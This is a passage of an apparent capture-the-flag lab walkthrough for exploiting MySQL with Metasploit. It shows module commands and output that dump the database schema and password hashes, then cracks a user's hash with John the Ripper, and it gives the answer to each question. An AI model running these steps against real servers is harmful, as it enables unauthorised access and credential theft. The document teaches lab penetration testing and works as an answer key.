</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Running module against 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Sending statement: <span style="color:#a6e3a1">&#39;show databases&#39;</span>...
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | information_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | mysql |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | performance_schema |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - | sys |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<h4 id="exploiting-mysql">Exploiting MySQL</h4>
<p>Take a sanity check before moving on to try and exploit the database fully. We know:</p>
<ol>
<li>MySQL server credentials</li>
<li>The version of MySQL running</li>
<li>The number of Databases, and their names.</li>
</ol>
<br>
<p><em>Schema</em>
In MySQL, physically, a <code>schema</code> is synonymous with a <code>database</code>. You can substitute the keyword schema instead of database in MySQL SQL syntax, for example using <code>CREATE SCHEMA</code> instead of <code>CREATE DATABASE</code>. Some other database products draw a distinction.</p>
<p><em>Hashes</em>
Hashes are the product of a cryptographic algorithm to turn a variable length input into a fixed length output. In MySQL hashes can be used in different ways, for instance to index data into a hash table. Each hash has a unique ID that serves as a pointer to the original data.</p>
<br>
<p>First, let&rsquo;s search for and select the <code>mysql_schemadump</code> module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_schemadump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_schemadump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_schemadump normal No MYSQL Schema Dump</span></span></code></pre></div>
<br>
<p>Great! Now, you&rsquo;ve done this a few times by now so I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What&rsquo;s the name of the last table that gets dumped?</p>






<pre tabindex="0"><code>x$waits_global_by_latency</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>DISPLAY_RESULTS <span style="color:#89dceb">true</span> yes Display the Results to the Screen
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-m
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>etasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>- TableName: x<span style="color:#f5e0dc">$waits_global_by_latency</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>  Columns:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>  - ColumnName: events
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>    ColumnType: varchar<span style="color:#89dceb;font-weight:bold">(</span>128<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>  - ColumnName: total
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>  - ColumnName: total_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>  - ColumnName: avg_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>  - ColumnName: max_latency
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>    ColumnType: bigint<span style="color:#89dceb;font-weight:bold">(</span>20<span style="color:#89dceb;font-weight:bold">)</span> unsigned
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better&hellip; search for and select the mysql_hashdump module. What&rsquo;s the module&rsquo;s full name?</p>






<pre tabindex="0"><code>auxiliary/scanner/mysql/mysql_hashdump</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_schemadump<span style="color:#89dceb;font-weight:bold">)</span> &gt; search mysql_hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/mysql/mysql_hashdump normal No MYSQL Password Hashdump
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">1</span> auxiliary/analyze/crack_databases normal No Password Cracker: Databases</span></span></code></pre></div>
<br>
<p>Again, I&rsquo;ll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?</p>






<pre tabindex="0"><code>carl</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasplo
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>it.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: carl:_EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>_<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called &ldquo;hash.txt&rdquo;.
What is the user/hash combination string?</p>






<pre tabindex="0"><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
<br>
<p>Now, we need to crack the password! Let&rsquo;s try <code>John the Ripper</code> against it using: <code>john hash.txt</code>. What is the password of the user we found?</p>






<pre tabindex="0"><code>doggie</code></pre>






